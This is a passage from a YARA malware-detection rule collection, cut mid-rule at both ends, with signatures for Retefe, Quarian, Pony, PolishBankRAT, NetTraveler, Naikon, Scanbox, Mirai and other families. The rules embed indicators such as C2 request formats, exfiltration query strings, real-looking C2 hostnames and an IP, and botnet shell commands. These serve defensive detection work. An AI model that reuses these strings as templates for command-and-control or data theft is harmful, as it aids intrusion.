author = "bartblaze"
description = "Retefe"
strings:
$string0 = "01050000"
$string1 = "00000000"
$string2 = "5061636b61676500"
$string3 = "000000000000000000000000000000000000000000000000000000000000000000000000000000"
$string4 = "{\\stylesheet{ Normal;}{\\s1 heading 1;}{\\s2 heading 2;}}"
$string5 = "02000000"
condition:
5 of them
}
rule SSC_RegSubDatStrings : RegSubDat Family
{
meta:
description = "RegSubDat Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-14"
strings:
$avg1 = "Button"
$avg2 = "Allow"
$avg3 = "Identity Protection"
$avg4 = "Allow for all"
$avg5 = "AVG Firewall Asks For Confirmation"
$mutex = "0x1A7B4C9F"
condition:
all of ($avg*) or $mutex
}
rule SSC_RegSubDatCode : RegSubDat Family
{
meta:
description = "RegSubDat code features"
author = "Seth Hardy"
last_modified = "2014-07-14"
strings:
// decryption loop
$ = { 80 34 3? 99 40 (3D FB 65 00 00 | 3B C6) 7? F? }
// push then pop values
$ = { 68 FF FF 7F 00 5? }
$ = { 68 FF 7F 00 00 5? }
condition:
all of them
}
rule SSC_QuarianCode : Quarian Family
{
meta:
description = "Quarian code features"
author = "Seth Hardy"
last_modified = "2014-07-09"
strings:
// decrypt in intelnat.sys
$ = { C1 E? 04 8B ?? F? C1 E? 05 33 C? }
// decrypt in mswsocket.dll
$ = { C1 EF 05 C1 E3 04 33 FB }
$ = { 33 D8 81 EE 47 86 C8 61 }
// loop in msupdate.dll
$ = { FF 45 E8 81 45 EC CC 00 00 00 E9 95 FE FF FF }
condition:
any of them
}
rule SSC_QuarianStrings : Quarian Family
{
meta:
description = "Quarian Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-09"
strings:
$ = "s061779s061750"
$ = "[OnUpLoadFile]"
$ = "[OnDownLoadFile]"
$ = "[FileTransfer]"
$ = "---- Not connect the Manager, so start UnInstall ----"
$ = "------- Enter CompressDownLoadDir ---------"
$ = "------- Enter DownLoadDirectory ---------"
$ = "[HandleAdditionalData]"
$ = "[mswsocket.dll]"
$ = "msupdate.dll........Enter ThreadCmd!"
$ = "ok1-1"
$ = "msupdate_tmp.dll"
$ = "replace Rpcss.dll successfully!"
$ = "f:\\loadhiddendriver-mdl\\objfre_win7_x86\\i386\\intelnat.pdb"
$ = "\\drivercashe\\" wide ascii
$ = "\\microsoft\\windwos\\" wide ascii
$ = "\\DosDevices\\LOADHIDDENDRIVER" wide ascii
$ = "\\Device\\LOADHIDDENDRIVER" wide ascii
$ = "Global\\state_maping" wide ascii
$ = "E:\\Code\\2.0\\2.0_multi-port\\2.0\\ServerInstall_New-2010-0913_sp3\\msupdataDll\\Release\\msupdate_tmp.pdb"
$ = "Global\\unInstall_event_1554_Ower" wide ascii
condition:
any of them
}
rule SSC_pony {
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-08-16"
description = "Identify Pony"
strings:
$s1 = "{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}"
$s2 = "YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0"
$s3 = "POST %s HTTP/1.0"
$s4 = "Accept-Encoding: identity, *;q=0"
//$useragent1 = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)"
//$useragent2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)"
condition:
$s1 and $s2 and $s3 and $s4
}
rule SSC_Trj_Ponmocup_Downloader {
meta:
author = "Centro Criptolgico Nacional (CCN)"
ref ="https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
description = "Ponmocup Downloader"
strings:
$mz = { 4d 5a }
$vb5 = "VB5" fullword ascii
$tpb = "www.thepiratebay.org" fullword wide
$ua = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; SV1)" fullword wide
condition:
($mz at 0) and ($vb5) and ($tpb) and ($ua)
}
rule SSC_Ponmocup
{
meta:
description = "Ponmocup plugin detection (memory)"
author = "Danny Heppener, Fox-IT"
reference = "https://foxitsecurity.files.wordpress.com/2015/12/foxit-whitepaper_ponmocup_1_1.pdf"
strings:
$1100 = {4D 5A 90 [29] 4C 04}
$1201 = {4D 5A 90 [29] B1 04}
$1300 = {4D 5A 90 [29] 14 05}
$1350 = {4D 5A 90 [29] 46 05}
$1400 = {4D 5A 90 [29] 78 05}
$1402 = {4D 5A 90 [29] 7A 05}
$1403 = {4D 5A 90 [29] 7B 05}
$1404 = {4D 5A 90 [29] 7C 05}
$1405 = {4D 5A 90 [29] 7D 05}
$1406 = {4D 5A 90 [29] 7E 05}
$1500 = {4D 5A 90 [29] DC 05}
$1501 = {4D 5A 90 [29] DD 05}
$1502 = {4D 5A 90 [29] DE 05}
$1505 = {4D 5A 90 [29] E1 05}
$1506 = {4D 5A 90 [29] E2 05}
$1507 = {4D 5A 90 [29] E3 05}
$1508 = {4D 5A 90 [29] E4 05}
$1509 = {4D 5A 90 [29] E5 05}
$1510 = {4D 5A 90 [29] E6 05}
$1511 = {4D 5A 90 [29] E7 05}
$1512 = {4D 5A 90 [29] E8 05}
$1600 = {4D 5A 90 [29] 40 06}
$1601 = {4D 5A 90 [29] 41 06}
$1700 = {4D 5A 90 [29] A4 06}
$1800 = {4D 5A 90 [29] 08 07}
$1801 = {4D 5A 90 [29] 09 07}
$1802 = {4D 5A 90 [29] 0A 07}
$1803 = {4D 5A 90 [29] 0B 07}
$2001 = {4D 5A 90 [29] D1 07}
$2002 = {4D 5A 90 [29] D2 07}
$2003 = {4D 5A 90 [29] D3 07}
$2004 = {4D 5A 90 [29] D4 07}
$2500 = {4D 5A 90 [29] C4 09}
$2501 = {4D 5A 90 [29] C5 09}
$2550 = {4D 5A 90 [29] F6 09}
$2600 = {4D 5A 90 [29] 28 0A}
$2610 = {4D 5A 90 [29] 32 0A}
$2700 = {4D 5A 90 [29] 8C 0A}
$2701 = {4D 5A 90 [29] 8D 0A}
$2750 = {4D 5A 90 [29] BE 0A}
$2760 = {4D 5A 90 [29] C8 0A}
$2810 = {4D 5A 90 [29] FA 0A}
condition:
any of ($1100,$1201,$1300,$1350,$1400,$1402,$1403,$1404,$1405,$1406,
$1500,$1501,$1502,$1505,$1506,$1507,$1508,$1509,$1510,$1511,$1512,$1600,$1601,$1700,$1800,$1801,
$1802,$1803,$2001,$2002,$2003,$2004,$2500,$2501,$2550,$2600,$2610,$2700,$2701,$2750,$2760,$2810)
}
rule SSC_Trj_Ponmocup {
meta:
author = "Centro Criptolgico Nacional (CCN)"
ref ="https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
description = "Ponmocup Installer"
strings:
$mz = { 4d 5a }
$pac = { 48 8F BB 54 5F 3E 4F 4E }
$unp = { 8B B8 7C 1F 46 00 33 C8 }
condition:
($mz at 0) and ($pac at 0x61F7C) and ($unp at 0x29F0)
}
rule SSC_Trj_Ponmocup_dll {
meta:
author = "Centro Criptolgico Nacional (CCN)"
ref ="https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
description = "Ponmocup Bot DLL"
strings:
$mz = { 4d 5a }
$pck = { 00 81 23 00 33 3E 00 00 3B F4 56 00 00 00 7D 00 }
$upk = { 68 F4 14 00 10 A1 6C C0 02 10 FF D0 59 59 E9 7A }
condition:
($mz at 0) and ($pck at 0x8a50) and ($upk at 0x61f)
}
rule SSC_PolishBankRAT_fdsvc_xor_loop
{
meta:
author = "Booz Allen Hamilton Dark Labs"
description = "Finds the custom xor decode loop for <PolishBankRAT_fdsvc>"
strings:
$loop = {0F B6 42 FF 48 8D 52 FF 30 42 01 FF CF 75 F1}
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $loop
}
rule SSC_PolishBankRAT_fdsvc_decode2
{
meta:
author = "Booz Allen Hamilton Dark Labs"
description = "Find a constant used as part of a payload decoding function in PolishBankRAT_fdsvc"
strings:
$part1 = {A6 EB 96}
$part2 = {61 B2 E2 EF}
$part3 = {0D CB E8 C4}
$part4 = {5A F1 66 9C}
$part5 = {A4 80 CD 9A}
$part6 = {F1 2F 46 25}
$part7 = {2F DB 16 26}
$part8 = {4B C4 3F 3C}
$str1 = "This program cannot be run in DOS mode"
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}
rule SSC_decoded_PolishBankRAT_fdsvc_strings
{
meta:
author = "Booz Allen Hamilton Dark Labs"
description = "Finds hard coded strings in PolishBankRAT_fdsvc"
strings:
$str1 = "ssylka" wide ascii
$str2 = "ustanavlivat" wide ascii
$str3 = "poluchit" wide ascii
$str4 = "pereslat" wide ascii
$str5 = "derzhat" wide ascii
$str6 = "vykhodit" wide ascii
$str7 = "Nachalo" wide ascii
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and 4 of ($str*)
}
rule SSC_PolishBankRAT_srservice_xorloop
{
meta:
author = "Booz Allen Hamilton Dark Labs"
description = "Finds the custom xor decode loop for <PolishBankRAT_srservice>"
strings:
$loop = { 48 8B CD E8 60 FF FF FF 48 FF C3 32 44 1E FF 48 FF CF 88 43 FF }
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $loop
}
rule SSC_PittyTiger {
meta:
author = " (@chort0)"
description = "Detect PittyTiger Trojan via common strings"
strings:
$ptUserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.; SV1)" // missing minor digit
$ptFC001 = "FC001" fullword
$ptPittyTiger = "PittyTiger" fullword
$trjHTMLerr = "trj:HTML Err." nocase fullword
$trjworkFunc = "trj:workFunc start." nocase fullword
$trjcmdtout = "trj:cmd time out." nocase fullword
$trjThrtout = "trj:Thread time out." nocase fullword
$trjCrPTdone = "trj:Create PT done." nocase fullword
$trjCrPTerr = "trj:Create PT error: mutex already exists." nocase fullword
$oddPippeFailed = "Create Pippe Failed!" fullword // extra 'p'
$oddXferingFile = "Transfering File" fullword // missing 'r'
$oddParasError = "put Paras Error:" fullword // abbreviated 'parameters'?
$oddCmdTOutkilled = "Cmd Time Out..Cmd has been killed." fullword
condition:
(any of ($pt*)) and (any of ($trj*)) and (any of ($odd*))
}
rule SSC_Odinaff_swift {
meta:
author = "@j0sm1"
date = "2016/10/27"
description = "Odinaff malware"
reference = "https://www.symantec.com/security_response/writeup.jsp?docid=2016-083006-4847-99"
filetype = "binary"
strings:
$s1 = "getapula.pdb"
$i1 = "wtsapi32.dll"
$i2 = "cmpbk32.dll"
$i3 = "PostMessageA"
$i4 = "PeekMessageW"
$i5 = "DispatchMessageW"
$i6 = "WTSEnumerateSessionsA"
condition:
all of them
}
rule SSC_StreamEx
{
strings:
$a = "0r+8DQY97XGB5iZ4Vf3KsEt61HLoTOuIqJPp2AlncRCgSxUWyebhMdmzvFjNwka="
$b = {34 ?? 88 04 11 48 63 C3 48 FF C1 48 3D D8 03 00 00}
$bb = {81 86 ?? ?? 00 10 34 ?? 88 86 ?? ?? 00 10 46 81 FE D8 03 00 00}
$c = "greendll"
$d = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" wide
$f = {26 5E 25 24 23 91 91 91 91}
$g = "D:\\pdb\\ht_d6.pdb"
condition:
$a or $b or $bb or ($c and $d) or $f or $g
}
rule SSC_TROJAN_Notepad {
meta:
Author = "RSA_IR"
Date     = "4Jun13"
File     = "notepad.exe v 1.1"
MD5      = "106E63DBDA3A76BEEB53A8BBD8F98927"
strings:
$s1 = "75BAA77C842BE168B0F66C42C7885997"
$s2 = "B523F63566F407F3834BCC54AAA32524"
condition:
$s1 or $s2
}
rule SSC_NionSpy : win32
{
meta:
description = "Triggers on old and new variants of W32/NionSpy file infector"
reference = "https://blogs.mcafee.com/mcafee-labs/taking-a-close-look-at-data-stealing-nionspy-file-infector"
strings:
$variant2015_infmarker = "aCfG92KXpcSo4Y94BnUrFmnNk27EhW6CqP5EnT"
$variant2013_infmarker = "ad6af8bd5835d19cc7fdc4c62fdf02a1"
$variant2013_string = "%s?cstorage=shell&comp=%s"
condition:
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($variant*)
}
rule SSC_NetpassStrings : NetPass Variant {
meta:
description = "Identifiers for netpass variant"
author = "Katie Kleemola"
last_updated = "2014-05-29"
strings:
$exif1 = "Device Protect ApplicatioN" wide
$exif2 = "beep.sys" wide //embedded exe name
$exif3 = "BEEP Driver" wide //embedded exe description
$string1 = "\x00NetPass Update\x00"
$string2 = "\x00%s:DOWNLOAD\x00"
$string3 = "\x00%s:UPDATE\x00"
$string4 = "\x00%s:uNINSTALL\x00"
condition:
all of ($exif*) or any of ($string*)
}
rule SSC_NetTravExports : NetTraveler Family {
meta:
description = "Export names for dll component"
author = "Katie Kleemola"
last_updated = "2014-05-20"
strings:
//dll component exports
$ = "?InjectDll@@YAHPAUHWND__@@K@Z"
$ = "?UnmapDll@@YAHXZ"
$ = "?g_bSubclassed@@3HA"
condition:
any of them
}
rule SSC_NetTravStrings : NetTraveler Family {
meta:
description = "Identifiers for NetTraveler DLL"
author = "Katie Kleemola"
last_updated = "2014-05-20"
strings:
//network strings
$ = "?action=updated&hostid="
$ = "travlerbackinfo"
$ = "?action=getcmd&hostid="
$ = "%s?action=gotcmd&hostid="
$ = "%s?hostid=%s&hostname=%s&hostip=%s&filename=%s&filestart=%u&filetext="
//debugging strings
$ = "\x00Method1 Fail!!!!!\x00"
$ = "\x00Method3 Fail!!!!!\x00"
$ = "\x00method currect:\x00"
$ = /\x00\x00[\w\-]+ is Running!\x00\x00/
$ = "\x00OtherTwo\x00"
condition:
any of them
}
rule SSC_nAspyUpdateCode : nAspyUpdate Family
{
meta:
description = "nAspyUpdate code features"
author = "Seth Hardy"
last_modified = "2014-07-14"
strings:
// decryption loop in dropper
$ = { 8A 54 24 14 8A 01 32 C2 02 C2 88 01 41 4E 75 F4 }
condition:
any of them
}
rule SSC_nAspyUpdateStrings : nAspyUpdate Family
{
meta:
description = "nAspyUpdate Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-14"
strings:
$ = "\\httpclient.txt"
$ = "password <=14"
$ = "/%ldn.txt"
$ = "Kill You\x00"
condition:
any of them
}
rule SSC_NaikonCode : Naikon Family
{
meta:
description = "Naikon code features"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
// decryption
$ = { 0F AF C1 C1 E0 1F } // imul eax, ecx; shl eah, 1fh
$ = { 35 5A 01 00 00} // xor eax, 15ah
$ = { 81 C2 7F 14 06 00 } // add edx, 6147fh
condition:
all of them
}
rule SSC_NaikonStrings : Naikon Family
{
meta:
description = "Naikon Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
$ = "NOKIAN95/WEB"
$ = "/tag=info&id=15"
$ = "skg(3)=&3.2d_u1"
$ = "\\Temp\\iExplorer.exe"
$ = "\\Temp\\\"TSG\""
condition:
any of them
}
rule SSC_Unit78020_Malware_Gen1
{
meta:
description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
author = "Florian Roth"
reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
date = "2015-09-24"
hash1 = "2b15e614fb54bca7031f64ab6caa1f77b4c07dac186826a6cd2e254090675d72"
hash2 = "76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd"
hash3 = "2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac"
hash4 = "5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2"
hash5 = "7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af"
hash6 = "88c5be84afe20c91e4024160303bafb044f98aa5fbf8c9f9997758a014238790"
strings:
$x1 = "greensky27.vicp.net" fullword wide
$x2 = "POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1" fullword ascii
$x3 = "GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1" fullword ascii
/* additional strings based on PDF report - not found in samples */
$x4 = "serch.vicp.net" fullword wide
$x5 = "greensky27.vicp.net" fullword wide
$x6 = "greensky27.vicp.net.as" fullword wide
$x7 = "greensky27.vcip.net" fullword wide
$x8 = "pnoc-ec.vicp.net" fullword wide
$x9 = "aseanph.vicp.net" fullword wide
$x10 = "pnoc.vicp.net" fullword wide
$a1 = "dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide /* typo */
$a2 = "User-Agent: Netscape" fullword ascii /* ;) */
$a3 = "Accept-Language:En-us/r/n" fullword wide /* typo */
$a4 = "\\Office Start.lnk" fullword wide
$a5 = "\\MSN Talk Start.lnk" fullword wide
$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
$s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
$s3 = "%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles" fullword wide
$s4 = "Content-Type:application/x-www-form-urlencoded/r/n" fullword wide
$s5 = "Hello World!" fullword wide
$s6 = "Accept-Encoding:gzip,deflate/r/n" fullword wide
$s7 = "/%d%s%d" fullword ascii
$s8 = "%02d-%02d-%02d %02d:%02d" fullword wide
$s9 = "WininetMM Version 1.0" fullword wide
$s10 = "WININETMM" fullword wide
$s11 = "GET %dHTTP/1.1" fullword ascii
$s12 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
$s13 = "PeekNamePipe" fullword ascii
$s14 = "Normal.dot" fullword ascii
$s15 = "R_eOR_eOR_eO)CiOS_eO" fullword ascii
$s16 = "DRIVE_RAMDISK" fullword wide
$s17 = "%s %s %s %s %d %d %d %d " fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 250KB and 1 of ($x*) ) or 2 of ($a*) or 6 of ($s*)
}
rule SSC_Unit78020_Malware_1
{
meta:
description = "Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe"
author = "Florian Roth"
reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
date = "2015-09-24"
hash = "a93d01f1cc2d18ced2f3b2b78319aadc112f611ab8911ae9e55e13557c1c791a"
strings:
$s1 = "%ProgramFiles%\\Internet Explorer\\iexplore.exe" fullword ascii
$s2 = "msictl.exe" fullword ascii
$s3 = "127.0.0.1:8080" fullword ascii
$s4 = "mshtml.dat" fullword ascii
$s5 = "msisvc" fullword ascii
$s6 = "NOKIAN95/WEB" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 160KB and 4 of them
}
rule SSC_Unit78020_Malware_Gen2
{
meta:
description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
author = "Florian Roth"
reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
date = "2015-09-24"
super_rule = 1
hash1 = "76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd"
hash2 = "7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af"
hash3 = "981e2fa1ae4145359036b46e8b53cc5da37dd2311204859761bd91572f025e8a"
strings:
$s0 = "-GetModuleFileNameExW" fullword ascii
$s1 = "\\MSN Talk Start.lnk" fullword wide
$s2 = ":SeDebugPrivilege" fullword wide
$s3 = "WinMM Version 1.0" fullword wide
$s4 = "dwError1 = %d" fullword ascii
$s5 = "*Can't Get" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_Unit78020_Malware_Gen3
{
meta:
description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong"
author = "Florian Roth"
reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
date = "2015-09-24"
super_rule = 1
hash1 = "2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac"
hash2 = "5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2"
strings:
$x1 = "GET http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
$x2 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
$x3 = "J:\\chong\\" ascii
$s1 = "User-Agent: Netscape" fullword ascii
$s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders" fullword wide
$s4 = "J:\\chong\\nod\\Release\\SslMM.exe" fullword ascii
$s5 = "MM.exe" fullword ascii
$s6 = "network.proxy.ssl" fullword wide
$s7 = "PeekNamePipe" fullword ascii
$s8 = "Host: %ws:%d" fullword ascii
$s9 = "GET %dHTTP/1.1" fullword ascii
$s10 = "SCHANNEL.DLL" fullword ascii /* Goodware String - occured 6 times */
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) ) or 4 of ($s*)
}
rule SSC_Backdoor_Naikon_APT_Sample1 {
meta:
description = "Detects backdoors related to the Naikon APT"
author = "Florian Roth"
reference = "https://goo.gl/7vHyvh"
date = "2015-05-14"
hash = "d5716c80cba8554eb79eecfb4aa3d99faf0435a1833ec5ef51f528146c758eba"
hash = "f5ab8e49c0778fa208baad660fe4fa40fc8a114f5f71614afbd6dcc09625cb96"
strings:
$x0 = "GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1" fullword ascii
$x1 = "POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1" fullword ascii
$x2 = "greensky27.vicp.net" fullword ascii
$x3 = "\\tempvxd.vxd.dll" fullword wide
$x4 = "otna.vicp.net" fullword ascii
$x5 = "smithking19.gicp.net" fullword ascii
$s1 = "User-Agent: webclient" fullword ascii
$s2 = "\\User.ini" fullword ascii
$s3 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200" ascii
$s4 = "\\UserProfile.dll" fullword wide
$s5 = "Connection:Keep-Alive: %d" fullword ascii
$s6 = "Referer: http://%s:%d/" fullword ascii
$s7 = "%s %s %s %d %d %d " fullword ascii
$s8 = "%s--%s" fullword wide
$s9 = "Run File Success!" fullword wide
$s10 = "DRIVE_REMOTE" fullword wide
$s11 = "ProxyEnable" fullword wide
$s12 = "\\cmd.exe" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and
(
1 of ($x*) or 7 of ($s*)
)
}
rule SSC_MongalCode
{
meta:
description = "Mongal code features"
author = "Seth Hardy"
last_modified = "2014-07-15"
strings:
// gettickcount value checking
$ = { 8B C8 B8 D3 4D 62 10 F7 E1 C1 EA 06 2B D6 83 FA 05 76 EB }
condition:
any of them
}
rule SSC_Backdoor_APT_Mongal
{
meta:
author = "@patrickrolsen"
maltype = "Backdoor.APT.Mongall"
version = "0.1"
reference = "fd69a799e21ccb308531ce6056944842"
date = "01/04/2014"
strings:
$author  = "author user"
$title   = "title Vjkygdjdtyuj" nocase
$comp    = "company ooo"
$cretime = "creatim\\yr2012\\mo4\\dy19\\hr15\\min10"
$passwd  = "password 00000000"
condition:
all of them
}
rule SSC_MongalStrings
{
meta:
description = "Mongal Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-15"
strings:
$ = "NSCortr.dll"
$ = "NSCortr1.dll"
$ = "Sina.exe"
condition:
any of them
}
rule SSC_NSFreeCode : NSFree Family
{
meta:
description = "NSFree code features"
author = "Seth Hardy"
last_modified = "2014-06-24"
strings:
// push vars then look for MZ
$ = { 53 56 57 66 81 38 4D 5A }
// nops then look for PE\0\0
$ = { 90 90 90 90 81 3F 50 45 00 00 }
condition:
all of them
}
rule SSC_NSFreeStrings : NSFree Family
{
meta:
description = "NSFree Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-24"
strings:
$ = "\\MicNS\\" nocase
$ = "NSFreeDll" wide ascii
// xor 0x58 dos stub
$ = { 0c 30 31 2b 78 28 2a 37 3f 2a 39 35 78 3b 39 36 36 37 }
condition:
any of them
}
rule SSC_CredStealESY : For CredStealer
{
meta:
description = "Generic Rule to detect the CredStealer Malware"
author = "IsecG  McAfee Labs"
date = "2015/05/08"
strings:
$my_hex_string = "CurrentControlSet\\Control\\Keyboard Layouts\\" wide //malware trying to get keyboard layout
$my_hex_string2 = {89 45 E8 3B 7D E8 7C 0F 8B 45 E8 05 FF 00 00 00 2B C7 89 45 E8} //specific decryption module
condition:
$my_hex_string and $my_hex_string2
}
rule SSC_PUP_InstallRex_AntiFWb {
meta:
description = "Malware InstallRex / AntiFW"
author = "Florian Roth"
date = "2015-05-13"
hash = "bb5607cd2ee51f039f60e32cf7edc4e21a2d95cd"
score = 65
strings:
$s4 = "Error %u while loading TSU.DLL %ls" fullword ascii
$s7 = "GetModuleFileName() failed => %u" fullword ascii
$s8 = "TSULoader.exe" fullword wide
$s15 = "\\StringFileInfo\\%04x%04x\\Arguments" fullword wide
$s17 = "Tsu%08lX.dll" fullword wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_EmiratesStatement
{
meta:
author = "Christiaan Beek"
date = "2013-06-30"
description = "Credentials Stealing Attack"
hash0 = "0e37b6efe5de1cc9236017e003b1fc37"
hash1 = "a28b22acf2358e6aced43a6260af9170"
hash2 = "6f506d7adfcc2288631ed2da37b0db04"
hash3 = "8aebade47dc1aa9ac4b5625acf5ade8f "
strings:
$string0 = "msn.klm"
$string1 = "wmsn.klm"
$string2 = "bms.klm"
condition:
all of them
}
rule SSC_apt_all_JavaScript_ScanboxFramework_obfuscated
{
meta:
ref = "https://www.fidelissecurity.com/TradeSecret"
strings:
$sa1 = /(var|new|return)\s[_\$]+\s?/
$sa2 = "function"
$sa3 = "toString"
$sa4 = "toUpperCase"
$sa5 = "arguments.length"
$sa6 = "return"
$sa7 = "while"
$sa8 = "unescape("
$sa9 = "365*10*24*60*60*1000"
$sa10 = ">> 2"
$sa11 = "& 3) << 4"
$sa12 = "& 15) << 2"
$sa13 = ">> 6) | 192"
$sa14 = "& 63) | 128"
$sa15 = ">> 12) | 224"
condition:
all of them
}
rule SSC_ScanBox_Malware_Generic {
meta:
description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
author = "Florian Roth"
reference1 = "http://goo.gl/MUUfjv"
reference2 = "http://goo.gl/WXUQcP"
date = "2015/02/28"
hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"
strings:
/* Sample 1 */
$s0 = "http://142.91.76.134/p.dat" fullword ascii
$s1 = "HttpDump 1.1" fullword ascii
/* Sample 2 */
$s3 = "SecureInput .exe" fullword wide
$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii
/* Sample 3 */
$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
$s6 = "ServiceMaix" fullword ascii
/* Certificate and Keywords */
$x1 = "Management Support Team1" fullword ascii
$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
$x3 = "SEOUL1" fullword ascii
condition:
( 1 of ($s*) and 2 of ($x*) ) or
( 3 of ($x*) )
}
rule SSC_more_scanbox {
strings:
$a = "navigator.plugins[x].filename.replace" nocase wide ascii
$b = "scanbox.basicposturl"
condition:
any of them
}
rule SSC_tran_duy_linh
{
meta:
author = "@patrickrolsen"
maltype = "Misc."
version = "0.2"
reference = "8fa804105b1e514e1998e543cd2ca4ea, 872876cfc9c1535cd2a5977568716ae1, etc."
date = "01/03/2014"
strings:
$doc = {D0 CF 11 E0} //DOCFILE0
$string1 = "Tran Duy Linh" fullword
$string2 = "DLC Corporation" fullword
condition:
($doc at 0) and (all of ($string*))
}
rule SSC_Mirai_SPARC_MSB : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - SPARC MSB"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5= "05891dbabc42a36f33c30535f0931555"
SHA1 = "3d770480b6410cba39e19b3a2ff3bec774cabe47"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
( $miname and $iptables1 and $iptables2 and $procnet )
}
rule SSC_Mirai_1 : MALW
{
meta:
description = "Mirai Variant 1"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "655c3cf460489a7d032c37cd5b84a3a8"
SHA1 = "4dd3803956bc31c8c7c504734bddec47a1b57d58"
strings:
$dir1 = "/dev/watchdog"
$dir2 = "/dev/misc/watchdog"
$pass1 = "PMMV"
$pass2 = "FGDCWNV"
$pass3 = "OMVJGP"
condition:
$dir1 and $pass1 and $pass2 and not $pass3 and not $dir2
}
rule SSC_Mirai_2 : MALW
{
meta:
description = "Mirai Variant 2"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "0e5bda9d39b03ce79ab8d421b90c0067"
